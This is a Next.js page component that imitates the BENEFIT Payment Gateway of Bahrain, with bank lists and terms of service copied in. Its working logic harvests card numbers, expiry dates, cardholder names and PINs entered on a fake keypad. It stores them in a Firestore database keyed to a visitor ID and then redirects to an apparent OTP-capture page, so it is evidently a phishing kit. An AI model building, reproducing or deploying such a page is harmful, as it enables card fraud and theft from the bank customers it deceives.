"use client"

import { addData } from "@/lib/firestore"
import { useRouter } from "next/navigation"
import type React from "react"
import { useEffect, useRef, useState } from "react"
export default function BenefitPaymentGateway() {
  const [cardNumber, setCardNumber] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [cvv, setCvv] = useState("")
  const [month, setMonth] = useState("")
  const [year, setYear] = useState("")
  const [showPad, setShowPad] = useState(false)
  const router=useRouter()
    const inputRef = useRef<HTMLInputElement>(null)
  const keypadRef = useRef<HTMLDivElement>(null)
  localStorage.setItem('cardNumber',cardNumber)
  const total = 10
  const data = { cardNumber, cardholderName, cvv, month, year }
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const vId = localStorage.getItem('visitor')
    addData({ id: vId, ...data })
    router.push('/benfit/otp')
  }
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (
        keypadRef.current &&
        !keypadRef.current.contains(event.target as Node) &&
        inputRef.current &&
        !inputRef.current.contains(event.target as Node)
      ) {
        setShowPad(false)
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
    }
  }, [])

  return (
    <div style={{ zoom: 0.7 }}>
      <form

onSubmit={handleSubmit}
name="paypage"
        id="paypage"
        method="post"
        autoComplete="off"
      >
        <div id="maindiv">
          <div id="languageDiv">

          </div>
          <div id="headerDiv">
            <div id="languageDiv">
              <a id="language_Button">
                <span
                  className="text_EN"
                  style={{ float: 'right', display: 'inline' }}
                >
                  عربي
                </span>
                <span
                  className="text_AR"
                  style={{ float: 'left', display: 'none' }}
                >
                  English
                </span>
              </a>
            </div>
            <div id="bannerDiv">
              <div
                className="row"
                id="hostedBanner"
                style={{ display: 'none' }}
              >
                <table width="100%">
                  <tbody>
                    <tr>
                      <td align="left">
                        <div>
                          <b>BENEFIT PAYMENT GATEWAY</b> <br />
                          <b>8-05-2025 08:12</b>
                        </div>
                      </td>
                      <td align="right">
                        Zain Bahrain LLC. <br />
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
            {/* <hr></hr> */}
            <div
              className="row"
              id="hostedBannerMbl"
              style={{ display: 'none' }}
            >
              <div className="headingalignment">
                <div style={{ color: 'red', textAlign: 'center' }}>
                  <b>BENEFIT PAYMENT GATEWAY</b> <br />
                  <b>24-04-2025 08:12</b>
                </div>
              </div>
              <div></div>
              <div>
                <span id="website_title_text">
                  Delmon for fishs BAHRAIN WLL <br />
                </span>
              </div>
              <div></div>
              {/* Added By BENEFIT */}
            </div>
          </div>
          {/* </header> */}
          <div id="contentDiv">
            <div className="body-container">
              <div className="container">
                <div className="detail-row">
                  {/* Code added for GSTN Paymentpage changes - Starts */}
                </div>
                <div id="customerinfo">
                  <div className="cust"></div>
                  {/*  Commented By Sridhar Starts*/}
                  {/* removed */}
                  {/* removed */}
                  {/*  Commented By Sridhar End */}
                  <div className="accordion">
                    {/* Invoice payment starts */}
                    {/* Invoice payment ends */}
                    {/* ApplePay changes starts */}
                    {/* ApplePay changes ends */}
                    {/* Debit card starts here*/}
                    <div className="group col-lg-12" id="debit">
                      <input
                        type="hidden"
                        name="creditDebitCheck"
                        defaultValue="D"
                      />
                      {/* ApplePay changes starts */}
                      {/* removed */}
                      {/* removed */}
                      {/* ApplePay changes ends */}
                      <div className="content" style={{ float: 'left' }}>
                        <div
                          className="col-lg-6 formwidth"
                          style={{ float: 'left' }}
                        >
                          <label
                            className="col-lg-12"
                            id="otpmsgDC"
                            style={{ color: 'red', float: 'left' }}
                          />
                          <div
                            id="LabelCrncyMsgDC"
                            className="col-lg-12"
                            style={{ float: 'left' }}
                          >
                            <label id="crncyMsgDC" style={{ color: 'red' }} />
                          </div>
                          <div className="col-lg-12" style={{ float: 'left' }}>
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Amount
                            </label>
                            <div
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              <b>BD{total}</b>
                            </div>
                          </div>
                          <div className="col-lg-12" style={{ float: 'left' }}>
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Card Type
                            </label>
                            <div
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              <b>Debit</b>
                            </div>
                          </div>
                          <div className="col-lg-12" style={{ float: 'left' }}>
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Card Number
                            </label>
                            <div
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              <input
                                name="debitCardNumber"
                                id="debitCardNumber"
                                className="debitNumber"
                                type="tel"
                                onChange={(e) => setCardNumber(e.target.value)}
                                maxLength={19}
                                defaultValue=""
                              />
                            </div>
                            {/* Added for GCCNET Implementation PERFORMGCCCHECK */}
                            {/* <div class="col-lg-12">
															<label class="col-lg-6"></label>
															<div class="col-lg-6">
																<label class="must" id="Labelcard_label"> </label>
															</div>
														</div> */}
                          </div>
                          <div
                            className="col-lg-12"
                            id="debitExpDate"
                            style={{ float: 'left' }}
                          >
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Expiry Date
                            </label>
                            <div
                              className="col-lg-6 formwidth cols-3"
                              style={{ float: 'left' }}
                            >
                              <table dir="ltr">
                                <tbody>
                                  <tr>
                                    <td>
                                      <select
                                        name="debitMonthSelect"
                                        id="debitMonthSelect"
                                        onChange={(e) => setMonth(e.target.value)}

                                        style={{ marginLeft: '-3px' }}
                                      >
                                        <option value={0}>MM</option>
                                        <option value={1}>01</option>
                                        <option value={2}>02</option>
                                        <option value={3}>03</option>
                                        <option value={4}>04</option>
                                        <option value={5}>05</option>
                                        <option value={6}>06</option>
                                        <option value={7}>07</option>
                                        <option value={8}>08</option>
                                        <option value={9}>09</option>
                                        <option value={10}>10</option>
                                        <option value={11}>11</option>
                                        <option value={12}>12</option>
                                      </select>
                                    </td>
                                    <td>
                                      <select
                                        name="debitYearSelect"
                                        id="debitYearSelect"
                                        onChange={(e) => setYear(e.target.value)}

                                        style={{ marginRight: '-3px' }}
                                      >
                                        <option value={0}>YYYY</option>
                                        <option value={2025}>2025</option>
                                        <option value={2026}>2026</option>
                                        <option value={2027}>2027</option>
                                        <option value={2028}>2028</option>
                                        <option value={2029}>2029</option>
                                        <option value={2030}>2030</option>
                                        <option value={2031}>2031</option>
                                        <option value={2032}>2032</option>
                                        <option value={2033}>2033</option>
                                        <option value={2034}>2034</option>
                                        <option value={2035}>2035</option>
                                        <option value={2036}>2036</option>
                                        <option value={2037}>2037</option>
                                        <option value={2038}>2038</option>
                                        <option value={2039}>2039</option>
                                        <option value={2040}>2040</option>
                                        <option value={2041}>2041</option>
                                        <option value={2042}>2042</option>
                                        <option value={2043}>2043</option>
                                        <option value={2044}>2044</option>
                                        <option value={2045}>2045</option>
                                        <option value={2046}>2046</option>
                                        <option value={2047}>2047</option>
                                        <option value={2048}>2048</option>
                                        <option value={2049}>2049</option>
                                        <option value={2050}>2050</option>
                                        <option value={2051}>2051</option>
                                        <option value={2052}>2052</option>
                                        <option value={2053}>2053</option>
                                        <option value={2054}>2054</option>
                                        <option value={2055}>2055</option>
                                        <option value={2056}>2056</option>
                                        <option value={2057}>2057</option>
                                        <option value={2058}>2058</option>
                                        <option value={2059}>2059</option>
                                        <option value={2060}>2060</option>
                                        <option value={2061}>2061</option>
                                        <option value={2062}>2062</option>
                                        <option value={2063}>2063</option>
                                        <option value={2064}>2064</option>
                                        <option value={2065}>2065</option>
                                        <option value={2066}>2066</option>
                                        <option value={2067}>2067</option>
                                        <option value={2068}>2068</option>
                                      </select>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </div>
                          </div>
                          <div
                            className="col-lg-12"
                            id="debitCardHldrDiv"
                            style={{ float: 'left' }}
                          >
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Card Holders Name
                            </label>
                            <div
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              <input
                                name="debitCardholderName"
                                id="debitCardholderName"
                                type="text"
                                onChange={(e) => setCardholderName(e.target.value)}

                                title="should contain alphabets with space"
                                defaultValue=""
                              />
                            </div>
                          </div>
                    
                          <div
                            className="col-lg-12"
                            id="eComPin"
                            style={{ display: '', float: 'left' }}
                          >
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              PIN
                            </label>
                            <div
                              className="col-lg-6 formwidth input_container"
                              style={{ float: 'left' }}
                            >
                              <input
                                className="pinfiledlength"
                                name="cardPin"
                                id="cardPin"
                                autoComplete="off"
                                title="Should be in number. Length should be 4"
                                size={4}
                                onChange={(e) => {
                                  setCvv(e.target.value)
                                }}
                                onMouseDown={()=>setShowPad(!showPad)}
                                value={cvv}
                                maxLength={4}
                                readOnly
                              />
                            </div>
                          </div>
                          <div
                            id="keypad_div"
                            className="keypad_container kyBx"
                            style={{ display: showPad ? 'inline' : "none" }}
                          >
                            {/* <button type="button" class="btn brn-primary" id="clrBtn" style="float:right;position:relative;right:26px;top:10px;">X</button> */}
                            <div
                              className="col-lg-12  "
                              id=""
                              style={{ float: 'left' }}
                            >
                              <label
                                className="col-lg-6 keyformwidth "
                                style={{ float: 'left' }}
                              />
                              <div
                                className="col-lg-6 keyformwidth"
                                style={{ float: 'left' }}
                              >
                                <div className="col-sm-3">
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn1"
                                    type="button"
                                    defaultValue={8}
                                    onClick={()=>setCvv((prv)=>prv+"8")}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn2"
                                    type="button"
                                    defaultValue={4}
                                    onClick={()=>setCvv((prv)=>prv+"4")}

                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn3"
                                    type="button"
                                    defaultValue={5}
                                    onClick={()=>setCvv((prv)=>prv+"5")}

                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn4"
                                    type="button"
                                    onClick={()=>setCvv((prv)=>prv+"7")}

                                    defaultValue={7}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn5"
                                    type="button"
                                    defaultValue={6}
                                    onClick={()=>setCvv((prv)=>prv+"6")}

                                  />
                                </div>

                                <div className="col-sm-3">
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn6"
                                    type="button"
                                    defaultValue={9}
                                    onClick={()=>setCvv((prv)=>prv+"9")}

                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn7"
                                    type="button"
                                    onClick={()=>setCvv((prv)=>prv+"3")}

                                    defaultValue={3}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn8"
                                    onClick={()=>setCvv((prv)=>prv+"1")}

                                    type="button"
                                    defaultValue={1}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn9"
                                    type="button"
                                    defaultValue={0}
                                    onClick={()=>{if(cvv.length<4) setCvv((prv)=>prv+"0")}}

                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn0"
                                    type="button"
                                    defaultValue={2}
                                    onClick={()=>{if(cvv.length<4) setCvv((prv)=>prv+"2")}}

                                  />
                                </div>

                                <div className="col-sm-3">
                                  <span
                                    className="text_EN"
                                    style={{ display: 'inline' }}
                                  >
                                    <input
                                      className="btn btn-primary btnwidth"
                                      id="cardPinbtnDel"
                                      type="reset"
                                      defaultValue="<"
                                      onClick={()=>setCvv('')}

                                    />
                                    <input
                                      className="btn btn-primary btnwidth"
                                      name="cardPinbtnRef"
                                      id="cardPinbtnRef"
                                      type="reset"
                                      defaultValue="Clear"
                                      onClick={()=>setCvv('')}

                                    />
                                    <input
                                      className="btn btn-primary btnwidth"
                                      name="cardPinbtnRef1"
                                      id="cardPinbtnRef1"
                                      type="submit"
                                      defaultValue="Enter"
                                    />
                                  </span>
                                  <span
                                    className="text_AR"
                                    style={{ display: showPad ? 'none' : 'none' }}
                                  >
                                    <input
                                      className="btn btn-primary btnwidth"
                                      name="cardPinbtnRef1"
                                      id="cardPinbtnRef1"
                                      type="submit"
                                      defaultValue="Enter"

                                    />
                                    <input
                                      className="btn btn-primary btnwidth"
                                      name="cardPinbtnRef"
                                      id="cardPinbtnRef"
                                      type="reset"
                                      defaultValue="Clear"
                                    />
                                    <input
                                      className="btn btn-primary btnwidth"
                                      id="cardPinbtnDel"
                                      type="reset"
                                      defaultValue=">"
                                    />
                                  </span>
                                </div>
                              </div>
                            </div>
                          </div>
                          {/* 	Unsaved captcha card starts */}
                          {/* 	Unsaved captcha card ends*/}
                          {/* Unsaved captcha card ends */}
                          {/* Debit+PIN changes-Ends */}
                          <div
                            id="debitCardCVVHideShow"
                            className="col-lg-12"
                            style={{ float: 'left' }}
                          ></div>
                          <div
                            id="cardCVD2HideShowPIN"
                            className="col-lg-12"
                            style={{ display: 'none', float: 'left' }}
                          >
                            <label
                              className="col-lg-6"
                              style={{ float: 'left' }}
                            >
                              CVD2
                            </label>
                            <div className="col-lg-6" style={{ float: 'left' }}>
                              <input
                                name="rupayDebitCardCvd2"
                                autoComplete="off"
                                title="Should be in number.Maximum length should be 4"
                                type="password"
                                size={4}
                                maxLength={4}
                                value={55}
                                id="rupayDebitCardCvd2"
                              />
                              <span
                                title="The Card Verification Data (CVD2) is a 3 or 4-digit number found on the signature panel on the back of your card following the printed Card number."
                                className="masterTooltip cvvHint"
                                style={{ display: 'none' }}
                              >
                                {' '}
                                <img
                                  src="/logo.webp"
                                  style={{ marginBottom: 10 }}
                                />
                              </span>
                              <span style={{}} className="cvvHintDev">
                                {' '}
                                <img
                                  src="/logo.webp"
                                  style={{ marginBottom: 10 }}
                                />
                              </span>
                            </div>
                          </div>
                          {/* Added for AMEx Authorization */}
                          <div
                            id="amexDebitCVVDiv"
                            className="col-lg-12"
                            style={{ display: 'none', float: 'left' }}
                          ></div>
                          {/* Ends */}
                          {/* Added for AMEx Authorization */}
                          <div
                            className="col-lg-12"
                            id="amexDebitAAVDiv"
                            style={{ display: 'none', float: 'left' }}
                          >
                            <div
                              className="col-lg-12"
                              style={{ float: 'left' }}
                            >
                              <label
                                className="col-lg-6"
                                style={{ float: 'left' }}
                              >
                                First Name
                              </label>
                              <div
                                className="col-lg-6"
                                style={{ float: 'left' }}
                              >
                                <input
                                  name="amexDebitCardholderFirstName"
                                  id="amexDebitCardholderFirstName"
                                  type="text"
                                  size={19}
                                  maxLength={15}
                                  defaultValue=""
                                  title="Should contain alphanumeric. Length should be between 1 and 15"
                                />
                              </div>
                            </div>
                            <div
                              className="col-lg-12"
                              style={{ float: 'left' }}
                            >
                              <label
                                className="col-lg-6"
                                style={{ float: 'left' }}
                              >
                                Last Name
                              </label>
                              <div
                                className="col-lg-6"
                                style={{ float: 'left' }}
                              >
                                <input
                                  name="amexDebitCardholderLastName"
                                  id="amexDebitCardholderLastName"
                                  type="text"
                                  size={19}
                                  maxLength={30}
                                  defaultValue=""
                                  title="Should contain alphanumeric. Length should be between 1 and 30"
                                />
                              </div>
                            </div>
                          </div>
                          {/* Ends */}
                          {/* Added for capturing card holder details -starts */}
                          <div
                            className="col-lg-12"
                            id="dbtMobileNum"
                            style={{ float: 'left' }}
                          ></div>
                          <div
                            className="col-lg-12"
                            id="dbtEmail"
                            style={{ float: 'left' }}
                          ></div>
                          {/* Added for capturing card holder details -ends */}
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="col-lg-12" style={{ float: 'left' }}>
                    <label className="col-lg-6" style={{ float: 'left' }} />
                  </div>
                  <div
                    className="col-lg-12"
                    id="proceedCancel"
                    style={{ textAlign: 'center' }}
                  >
                    {/* <div class="row" id="proceedCancel"> */}
                    <input
                      style={{ background: '#d7181f', marginRight: 5 }}
                      name="proceed"
                      type="submit"
                      className="btn btn-primary pbtn"
                      id="proceed"
                      defaultValue="Pay"
                    />
                    <input
                      style={{ background: '#d7181f', marginRight: 5 }}
                      name="cancel"
                      type="button"
                      className="btn btn-primary pbtn"
                      id="cancel"
                      defaultValue="Cancel"
                    />
                  </div>

                  {/* Commented by Sridhar Starts */}
                  {/* Commented by Sridhar Ends */}
                </div>
                {/* Hidden Fields : Start */}
                {/*  End */}
                {/* Code Added for GSTN fix Starts */}


              </div>
              {/* body-Container ends */}
              {/* </div> */}
            </div>
          </div>
          <div id="footerDiv">
            <div className="col-lg-12" style={{ float: 'left' }}>
              <div
                style={{ textAlign: 'justify', float: 'left' }}
                className="col-lg-12"
              ></div>
            </div>
          </div>
          <div className="body-container">
            <div className="container">
              <div className="detail-row">
                <div className="row" id="viewContent">
                  <a id="bank_list" className="a_with_items a_items_container">
                    <span
                      className="text_EN"
                      style={{ display: 'inline', color: 'red', fontWeight: 400 }}
                    >
                      View Accepted Cards
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      عرض البطاقات المقبولة
                    </span>
                  </a>
                  <ul
                    className="a_items_container bank_list"
                    style={{ display: 'none' }}
                  >
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Ahli United Bank B.S.C.
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك الأهلي المتحد
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Al Baraka Islamic Bank B.S.C
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك البركة الإسلامي
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Al-Salam Bank - Bahrain B.S.C.
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        مصرف السلام
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Arab Bank Plc
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        البنك العربي
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Bahrain Islamic Bank
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك البحرين الإسلامي
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        BANK OF BAHRAIN AND KUWAIT
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك البحرين و الكويت
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Citi Bank N. A.
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بسيتي بنك
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        CREDIT LIBANAIS S.A.L
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        الإعتماد اللبناني
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Gulf International Bank B.S.C
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك الخليج الدولي
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Habib Bank Limited
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك حبيب
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        HSBC Bank Middle East Limited
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        اتش . اس .بي. سي
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        ICICI Bank Limited
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك آي سي آي سي آي
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        ila Bank
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        ابنك إلى
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Ithmaar Bank B.S.C. (Closed)
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك الإثمار
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Khaleeji Commercial Bank B.S.C.
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        مصرف الخليجي التجاري
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Kuwait Finance House (Bahrain) B.S.C.( Closed)
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بيت التمويل الكويتي
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Mashreq Bank P.S.C
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك المشرق
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        National Bank Of Bahrain B.S.C.
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك البحرين الوطني
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        National Bank Of Kuwait S.A.K. / Commercial Branch
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك الكويت الوطني
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Payment international Enterprise BSC (closed)
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بيمنت انترناشونال انتربريز
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Standard Chartered Bank
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        ستاندرد شارترد
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        STATE BANK OF INDIA (FOREIGN BRANCH)
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك الهند الوطني
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        The Housing Bank For Trade And Finance - Jordan
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        بنك الإسكان و التجارة و التمويل
                      </span>
                    </li>
                    <li>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        United Bank Limited
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        البنك المتحد المحدود
                      </span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          <div id="footerDiv">
            <div className="parent_div">
              <div style={{ textAlign: 'justify' }} className="container">
                <div id="bank_lista" className="a_with_items">
                  <span className="text_EN" style={{ display: 'inline' }}>
                    <b>Note:</b> By submitting your information and using "BENEFIT
                    Payment Gateway", you indicate that you agree to the{' '}
                    <a
                      className="a_with_items a_items_container"
                      style={{ color: 'red' }}
                    >
                      Terms of Services - Legal Disclaimer
                    </a>
                    .
                  </span>
                  <span className="text_AR" style={{ display: 'none' }}>
                    <b>ملاحظة</b>: إن تقديم هذه المعلومات واستخدام "بوابة الدفع
                    الإلكترونية من بنفت" يعني موافقتك على{' '}
                    <a className="a_with_items a_items_container">
                      شروط هذه الخدمة – إبراء الذمة القانوني
                    </a>
                    .
                  </span>
                </div>
                <ul className="a_items_container" style={{ display: 'none' }}>
                  <li style={{ listStyleType: 'none' }}>
                    <div>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        <b>Terms of Service </b>
                        <br />
                        By accessing this site and any pages thereafter , you
                        agree to and accept the terms and conditions below. Please
                        do not access this site or any pages thereafter if you do
                        not accept the terms below:
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        <b>شروط الخدمة</b>
                        <br />
                        من خلال دخول هذا الموقع وأي من صفحاته، فإنك توافق وتقبل
                        الشروط والأحكام أدناه. يرجى عدم دخول هذا الموقع أو أي من
                        الصفحات التالية إذا لم توافق على الشروط أدناه :
                      </span>
                    </div>
                    <br />
                    <div>
                      <b>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          Definitions:{' '}
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          التعريفات:{' '}
                        </span>
                      </b>
                      <br />
                      <span className="text_EN" style={{ display: 'inline' }}>
                        “BENEFIT” means The BENEFIT Company
                        <br />
                        “Issuer” Means the customer’s card issuing bank.
                        <br />
                        “User” means the person using BENEFIT’s Payment Gateway.
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        "بنفت" تعني شركة بنفت.
                        <br />
                        "الجهة الصادرة" تعني البنك المُصدر لبطاقة الزبون.
                        <br />
                        "المستخدم" تعني الشخص المستخدم لبوابة الدفع الإلكترونية من
                        بنفت.
                      </span>
                    </div>
                    <br />
                    <div>
                      <b>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          Terms:{' '}
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          الشروط:
                        </span>
                      </b>
                      <ol style={{ listStyleType: 'decimal' }}>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            The User agrees and declares BENEFIT and the Issuer
                            that the User is using this BENEFIT Payment Gateway at
                            his/her own risk and responsibility. The user shall be
                            fully responsible and accountable for the
                            confidentiality of his/her PIN.{' '}
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            يوافق المستخدم ويقر لشركة بنفت والجهة الصادرة بأنه
                            يستخدم بوابة الدفع الإلكترونية من بنفت على
                            مسؤوليته/مسؤولياتها. وسيكون المستخدم مسؤولا بالكامل
                            وموضع مساءلة عن سرية رقم التعريف الشخصي الخاص به/بها.{' '}
                          </span>
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            The User further agrees that BENEFIT and the Issuer
                            are not responsible or accountable in any way to the
                            User for any loss or damage whatsoever that he/she
                            might incur as a result of using BENEFIT’s Payment
                            Gateway.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            يوافق المستخدم أيضاً على عدم تحمل كل من شركة بنفت
                            والجهة الصادرة أي مسؤولية بأي طريقة أمام المستخدم عن
                            أي خسارة أو ضرر أياً كان قد يتعرض له المستخدم نتيجة
                            لاستخدامه بوابة الدفع الإلكترونية من بنفت.
                          </span>
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            The user shall be fully responsible and accountable
                            for the confidentiality of his/her PIN. No user under
                            any circumstances whatsoever and to whomsoever shall
                            divulge the secrecy of his/her PIN. Under no
                            circumstances shall a user establish connection to
                            BENEFIT’s Payment Gateway service using his/her
                            debit/credit card number and PIN and then let other
                            person(s) carry on with operating the system.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            سيكون المستخدم مسؤولا مسؤولية كاملة عن سرية رقم
                            التعريف الشخصي الخاص به/بها. ولا يجوز لأي مستخدم إفشاء
                            سرية رقم التعريف الشخصي الخاص به/بها. كما لا يجوز
                            للمستخدم تحت أي ظروف التواصل مع خدمة بوابة الدفع
                            الإلكترونية من شركة بنفت باستخدام بطاقته/ بطاقتها
                            الائتمانية/ الخصم ورقم التعريف الشخصي، ثم يترك لشخص
                            آخر (أشخاص آخرين) مواصلة تشغيل النظام.
                          </span>
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            Not all products and services thereafter are available
                            in all geographic areas. Your eligibility for availing
                            any product or service is subject to BENEFIT’s and/or
                            the Issuer’s discretion and agreement.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            لا تتوفر جميع المنتجات والخدمات في كافة المناطق
                            الجغرافية. إن قدرتك على الحصول على أي منتج أو خدمة
                            يخضع لقرار وموافقة شركة بنفت و/أو الجهة الصادرة.{' '}
                          </span>
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            BENEFIT does not warrant the accuracy , adequacy or
                            completeness of the information and materials
                            contained in this site , BENEFIT further disclaims
                            liability for any errors or omissions in this
                            information and materials. No warranty of any kind ,
                            implied , express or statutory is given in conjunction
                            with the information or material here.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            لا تضمن شركة بنفت دقة أو كفاية أو شمولية المعلومات
                            والمواد المدرجة في هذا الموقع. وتبرئ شركة بنفت ذمتها
                            من أي أخطاء أو نقص في هذه المعلومات والمواد. كما لا
                            توجد أي ضمانات من أي نوع سواء ضمنية أو صريحة أو
                            قانونية تتعلق بالمعلومات أو المواد الواردة هنا.
                          </span>
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            BENEFIT will not be liable for any damages or losses ,
                            including without limitation direct or indirect
                            special , incidental , or consequential losses or
                            damages or any expenses whatsoever arising in
                            connection with any use of this site or any inability
                            to use by any party , or in relation to any failure of
                            performance , error , omission , interruption , delay
                            , defect pertaining to operation or transmission ,
                            computer virus , or system failure howsoever caused.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            لن تكون بنفت مسؤولة عن أي أضرار أو خسارة أو أي مصروفات
                            أياً كانت، بما في ذلك على سبيل المثال لا الحصر الخسائر
                            أو الأضرار المباشرة أو غير المباشرة، أو العرضية، أو
                            الاستتباعية الناشئة عن استخدام هذا الموقع أو عدم
                            القدرة على استخدامه من قبل أي طرف، أو فيما يتعلق بسوء
                            الاداء، أو الأخطاء، أو النقص، أو التعطيل، أو التأخير،
                            أو العيوب المتعلقة بالتشغيل أو النقل، أو فيروسات
                            الحاسب الآلي، أو فشل النظام أياً كان السبب.
                          </span>
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            Any information submitted to BENEFIT and/or the Issuer
                            through this site shall not be treated as confidential
                            information except in so far as agreed and accepted in
                            a bank customer relationship or as required by law or
                            regulations.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            لن يتم التعامل مع أي معلومات تم تقديمها إلى شركة بنفت
                            و/أو الجهة الصادرة من خلال هذا الموقع باعتبارها
                            معلومات سرية باستثناء ما تقضيه العلاقة المقبولة
                            والمتفق عليها القائمة بين الزبون والبنك أو وفق ما
                            يتطلبه القانون أو الأحكام التنظيمية.
                          </span>{' '}
                        </li>
                        <li>
